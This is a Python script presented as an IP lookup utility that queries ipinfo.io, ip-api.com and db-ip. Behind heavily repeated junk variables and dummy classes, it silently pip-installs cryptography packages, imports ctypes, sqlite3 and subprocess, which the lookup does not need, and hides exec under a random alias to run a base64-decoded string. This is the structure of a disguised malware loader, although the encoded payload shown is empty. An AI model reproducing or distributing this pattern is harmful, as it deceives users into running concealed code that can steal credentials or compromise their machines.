import os
import sys
import json
import requests
import time
import webbrowser
from pystyle import *
from colorama import *


from sys import executable, stderr
xwM0EClS59 = 39481632
Lxd1wwUXI4 = 71207051
UBHH5DuqTV = 52520811
wJgiWMe8B2 = 84830466
zTvWM61LDZ = 90822472
'YRuTCQNDtj'
akRlyajBDm = 22281547
class KgKqnBtZVD:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class OyWiLOBUlG:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
c78DaRdQUu = 2126272
hXtIrInM0N = 98756011
class x1sRl8rP9D:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class VzPfEa8iGH:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
ahAM5m7AG0 = 76119633
class zPf8bi3BFJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class ud2SVeaqJY:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class UHG3abn49u:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class iVARURedhq:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class LTCeFe7Anj:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class VPgwuFitsE:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'uVoymAsU09'", "'eoXD9azu4t'", "'JN2O9ZBV0M'"]
{'username': 'ngcwHT9', 'age': 64}
zyYcVhHIiG = 5556403
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodomex']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
xwM0EClS59 = 39481632
Lxd1wwUXI4 = 71207051
UBHH5DuqTV = 52520811
wJgiWMe8B2 = 84830466
zTvWM61LDZ = 90822472
'YRuTCQNDtj'
akRlyajBDm = 22281547
class KgKqnBtZVD:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class OyWiLOBUlG:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
c78DaRdQUu = 2126272
hXtIrInM0N = 98756011
class x1sRl8rP9D:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class VzPfEa8iGH:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
ahAM5m7AG0 = 76119633
class zPf8bi3BFJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class ud2SVeaqJY:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class UHG3abn49u:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class iVARURedhq:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class LTCeFe7Anj:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class VPgwuFitsE:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'uVoymAsU09'", "'eoXD9azu4t'", "'JN2O9ZBV0M'"]
{'username': 'ngcwHT9', 'age': 64}
zyYcVhHIiG = 5556403
tMuTVYRixlUVtHn4apZ1LVkuzUmCkzbUGFvSRC = exec
xwM0EClS59 = 39481632
Lxd1wwUXI4 = 71207051
UBHH5DuqTV = 52520811
wJgiWMe8B2 = 84830466
zTvWM61LDZ = 90822472
'YRuTCQNDtj'
akRlyajBDm = 22281547
class KgKqnBtZVD:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class OyWiLOBUlG:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
c78DaRdQUu = 2126272
hXtIrInM0N = 98756011
class x1sRl8rP9D:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class VzPfEa8iGH:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
ahAM5m7AG0 = 76119633
class zPf8bi3BFJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class ud2SVeaqJY:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class UHG3abn49u:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class iVARURedhq:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class LTCeFe7Anj:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class VPgwuFitsE:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'uVoymAsU09'", "'eoXD9azu4t'", "'JN2O9ZBV0M'"]
{'username': 'ngcwHT9', 'age': 64}
zyYcVhHIiG = 5556403
import concurrent.futures
BLKTDVRguWD1hBJ1UlKnUCQgubn5YEsXgaYMia=""
tMuTVYRixlUVtHn4apZ1LVkuzUmCkzbUGFvSRC(base64.b64decode(BLKTDVRguWD1hBJ1UlKnUCQgubn5YEsXgaYMia))
xwM0EClS59 = 39481632
Lxd1wwUXI4 = 71207051
UBHH5DuqTV = 52520811
wJgiWMe8B2 = 84830466
zTvWM61LDZ = 90822472
'YRuTCQNDtj'
akRlyajBDm = 22281547
class KgKqnBtZVD:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class OyWiLOBUlG:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
c78DaRdQUu = 2126272
hXtIrInM0N = 98756011
class x1sRl8rP9D:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class VzPfEa8iGH:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
ahAM5m7AG0 = 76119633
class zPf8bi3BFJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class ud2SVeaqJY:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class UHG3abn49u:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class iVARURedhq:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class LTCeFe7Anj:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class VPgwuFitsE:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'uVoymAsU09'", "'eoXD9azu4t'", "'JN2O9ZBV0M'"]
{'username': 'ngcwHT9', 'age': 64}
zyYcVhHIiG = 5556403
os.system("cls || clear")

intro = """ 
            ██╗██████╗     ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗ 
            ██║██╔══██╗    ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗
            ██║██████╔╝    ██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║██████╔╝
            ██║██╔═══╝     ██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔═══╝ 
            ██║██║         ███████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║     
            ╚═╝╚═╝         ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     
                                                                 
                              [+] github.com/ZekromDev

                             >> Press Enter <<"""

Anime.Fade(Center.Center(intro), Colors.white_to_blue, Colorate.Vertical, interval=0.035, enter=True)
webbrowser.open_new_tab("https://github.com/ZekromDev")

def aff():
    print(f"""{Fore.LIGHTRED_EX} 
_____  _____               _____   _____  _     _ _     _  _____ 
   |   |_____]      |      |     | |     | |____/  |     | |_____]
 __|__ |            |_____ |_____| |_____| |    \_ |_____| |      
                                                             By ZekromDev
        """)

    time.sleep(1)

def ip():
    Write.Print("\n[+] >> Enter an ip to lookup : ", Colors.white_to_blue, end='')
    ip_addr = input()
    print("\n")

    req1 = requests.get(f"http://ipinfo.io/{ip_addr}")
    req2 = requests.get(f"http://ip-api.com/json/{ip_addr}")
    req3 = requests.get(f"http://api.db-ip.com/v2/free/{ip_addr}")

    resp1 = req1.text
    resp2 = req2.text
    resp3 = req3.text

    Write.Print(f"[!] {resp3}", Colors.white_to_blue)
    print("\n")
    Write.Print(f"[!] {resp1}", Colors.white_to_blue)
    print("\n")
    Write.Print(f"[!] {resp2}", Colors.white_to_blue)
    print("\n")

      
    Write.Print("[#] Results will be deleted in 25s [#]", Colors.blue_to_white)
    time.sleep(25)
    os.system("clear || cls")
while True:
    aff()
    ip()
